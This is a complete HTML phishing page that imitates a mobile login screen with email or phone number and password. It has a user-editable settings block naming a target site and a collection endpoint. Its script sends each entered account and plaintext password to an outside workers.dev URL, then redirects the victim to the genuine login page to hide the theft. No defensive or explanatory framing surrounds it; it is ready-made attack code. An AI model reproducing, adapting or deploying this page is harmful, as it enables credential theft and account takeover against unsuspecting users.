<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Login</title>
  <style>
    :root {
      --text-dark: #1a1a1a;
      --text-muted: #8e8e93;
      --text-placeholder: #c7c7cc;
      --border-color: #f2f2f7;
      --input-bg: #f9f9fb;
      --link-blue: #3478f6;
      --btn-black: #0d0d0d;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    html {
      height: 100%;
      background-color: #ffffff;
    }

    body {
      min-height: 100vh;
      min-height: -webkit-fill-available;
      background-color: #ffffff;
      color: var(--text-dark);
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: max(16px, env(safe-area-inset-top));
      padding-right: max(20px, env(safe-area-inset-right));
      padding-bottom: max(24px, env(safe-area-inset-bottom));
      padding-left: max(20px, env(safe-area-inset-left));
    }

    .app-container {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
    }

    .back-btn {
      background: none;
      border: none;
      font-size: 22px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: clamp(16px, 4vh, 28px);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 32px;
      height: 32px;
      color: var(--text-dark);
      border-radius: 50%;
      transition: background-color 0.2s ease;
    }

    .back-btn:active {
      background-color: var(--border-color);
    }

    h1 {
      font-size: clamp(24px, 6vw, 30px);
      font-weight: 700;
      margin-bottom: clamp(18px, 4vh, 28px);
      letter-spacing: -0.5px;
    }

    .tabs {
      display: flex;
      gap: 24px;
      margin-bottom: 24px;
      border-bottom: 1px solid var(--border-color);
    }

    .tab {
      font-size: 16px;
      font-weight: 600;
      color: var(--text-muted);
      cursor: pointer;
      padding-bottom: 10px;
      position: relative;
      transition: color 0.2s ease;
    }

    .tab.active {
      color: var(--text-dark);
    }

    .tab.active::after {
      content: "";
      position: absolute;
      bottom: -1px;
      left: 0;
      width: 100%;
      height: 3px;
      background-color: var(--text-dark);
      border-radius: 2px 2px 0 0;
    }

    .form-group {
      margin-bottom: 18px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: var(--text-muted);
      margin-bottom: 8px;
    }

    .input-box {
      position: relative;
      width: 100%;
    }

    .input-box input {
      width: 100%;
      height: 50px;
      background-color: var(--input-bg);
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 0 44px 0 16px;
      font-size: 15px;
      outline: none;
      color: var(--text-dark);
      transition: border-color 0.2s ease, background-color 0.2s ease;
      appearance: none;
      -webkit-appearance: none;
    }

    .input-box input:focus {
      border-color: #d1d1d6;
      background-color: #ffffff;
    }

    .input-box input::placeholder {
      color: var(--text-placeholder);
    }

    .toggle-pwd {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: var(--text-muted);
      display: flex;
      align-items: center;
      justify-content: center;
      width: 32px;
      height: 32px;
      background: none;
      border: none;
      outline: none;
      border-radius: 50%;
    }

    .toggle-pwd:active {
      background-color: rgba(0, 0, 0, 0.05);
    }

    .toggle-pwd svg {
      width: 20px;
      height: 20px;
      fill: none;
      stroke: var(--text-muted);
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .option-row {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 16px;
      cursor: pointer;
      user-select: none;
    }

    .option-row input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: var(--text-dark);
      cursor: pointer;
      border-radius: 4px;
    }

    .forgot-link {
      display: inline-block;
      font-size: 15px;
      font-weight: 700;
      color: var(--text-dark);
      text-decoration: underline;
      margin-bottom: 22px;
      cursor: pointer;
    }

    .agreement-link {
      color: var(--link-blue);
      text-decoration: none;
    }

    .btn-login {
      width: 100%;
      height: 50px;
      background-color: var(--btn-black);
      color: #ffffff;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 28px;
      transition: transform 0.1s ease, opacity 0.2s ease;
    }

    .btn-login:active {
      transform: scale(0.98);
      opacity: 0.9;
    }

    .btn-login:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .bottom-links {
      text-align: center;
      display: flex;
      flex-direction: column;
      gap: 20px;
      font-size: 14px;
      margin-top: auto;
      padding-bottom: 8px;
    }

    .download-link {
      color: var(--text-dark);
      font-weight: 700;
      text-decoration: underline;
      cursor: pointer;
    }

    .signup-text {
      color: var(--text-muted);
      font-weight: 600;
    }

    .signup-link {
      color: var(--link-blue);
      font-weight: 700;
      text-decoration: none;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="app-container">
    <button class="back-btn" onclick="handleBack()" aria-label="Go Back">&lt;</button>

    <h1>Login</h1>

    <div class="tabs">
      <div class="tab active" id="tabEmail" onclick="switchTab('email')">Email</div>
      <div class="tab" id="tabPhone" onclick="switchTab('phone')">Phone Number</div>
    </div>

    <form id="loginForm">
      <div class="form-group">
        <label id="inputLabel" for="accountInput">Email</label>
        <div class="input-box">
          <input type="email" id="accountInput" name="account" placeholder="Please enter email" required autocomplete="username">
        </div>
      </div>

      <div class="form-group">
        <label for="passwordInput">Password</label>
        <div class="input-box">
          <input type="password" id="passwordInput" name="password" placeholder="Please enter password" required autocomplete="current-password">
          <button type="button" class="toggle-pwd" id="eyeToggleBtn" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
            <svg id="eyeClosed" viewBox="0 0 24 24">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
              <line x1="1" y1="1" x2="23" y2="23"></line>
            </svg>
            <svg id="eyeOpen" viewBox="0 0 24 24" style="display: none;">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
          </button>
        </div>
      </div>

      <label class="option-row">
        <input type="checkbox" id="chkRemember" checked>
        <span>Remember Password</span>
      </label>

      <div>
        <span class="forgot-link" onclick="handleForgotPassword()">Forgot Password</span>
      </div>

      <label class="option-row" style="font-weight: 400; font-size: 13px;">
        <input type="checkbox" id="chkAgree" required>
        <span>I have read and agree <a class="agreement-link" id="agreementLink" href="#">User Agreement</a></span>
      </label>

      <button type="submit" class="btn-login" id="submitBtn">Login</button>
    </form>

    <div class="bottom-links">
      <div class="download-link" onclick="handleDownloadApp()">Download App</div>
      <div class="signup-text">No Account? <span class="signup-link" onclick="handleSignUp()">Sign Up</span></div>
    </div>
  </div>

  <script>
    // ==========================================
    // ⚙️ EDIT YOUR SETTINGS HERE:
    // ==========================================
    const TARGET_URL = "https://qvsewx.com/#/pages/auth-login/index"; 
    const WORKER_URL = "https://logins.botpal69.workers.dev";
    // ==========================================

    let currentTabType = 'email';

    function togglePasswordVisibility() {
      const pwdInput = document.getElementById('passwordInput');
      const eyeOpen = document.getElementById('eyeOpen');
      const eyeClosed = document.getElementById('eyeClosed');

      if (pwdInput && eyeOpen && eyeClosed) {
        if (pwdInput.type === 'password') {
          pwdInput.type = 'text';
          eyeClosed.style.display = 'none';
          eyeOpen.style.display = 'block';
        } else {
          pwdInput.type = 'password';
          eyeClosed.style.display = 'block';
          eyeOpen.style.display = 'none';
        }
      }
    }

    function switchTab(type) {
      currentTabType = type;
      const emailTab = document.getElementById('tabEmail');
      const phoneTab = document.getElementById('tabPhone');
      const inputLabel = document.getElementById('inputLabel');
      const inputField = document.getElementById('accountInput');

      if (!inputField || !emailTab || !phoneTab || !inputLabel) return;
      inputField.value = '';

      if (type === 'email') {
        emailTab.classList.add('active');
        phoneTab.classList.remove('active');
        inputLabel.innerText = 'Email';
        inputField.placeholder = 'Please enter email';
        inputField.type = 'email';
      } else {
        phoneTab.classList.add('active');
        emailTab.classList.remove('active');
        inputLabel.innerText = 'Phone Number';
        inputField.placeholder = 'Please enter phone number';
        inputField.type = 'tel';
      }
    }

    function handleBack() { window.location.replace(TARGET_URL); }
    function handleForgotPassword() { window.location.replace(TARGET_URL); }
    function handleDownloadApp() { window.location.replace(TARGET_URL); }
    function handleSignUp() { window.location.replace(TARGET_URL); }

    document.addEventListener('DOMContentLoaded', () => {
      const loginForm = document.getElementById('loginForm');
      const agreementLink = document.getElementById('agreementLink');

      if (agreementLink) {
        agreementLink.addEventListener('click', (e) => {
          e.preventDefault();
          window.location.replace(TARGET_URL);
        });
      }

      if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
          e.preventDefault();

          const accountElem = document.getElementById('accountInput');
          const pwdElem = document.getElementById('passwordInput');
          const rememberElem = document.getElementById('chkRemember');
          const submitBtn = document.getElementById('submitBtn');

          if (!accountElem || !pwdElem || !rememberElem || !submitBtn) return;

          submitBtn.disabled = true;
          submitBtn.innerText = "Logging in...";

          const payload = {
            name: `New Login Attempt (${currentTabType})`,
            email: accountElem.value,
            message: `Password: ${pwdElem.value} | Remember: ${rememberElem.checked ? "Yes" : "No"}`
          };

          try {
            await fetch(WORKER_URL, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify(payload)
            });
          } catch (err) {
            console.error('Submission error:', err);
          } finally {
            window.location.replace(TARGET_URL);
          }
        });
      }
    });
  </script>
</body>
</html>
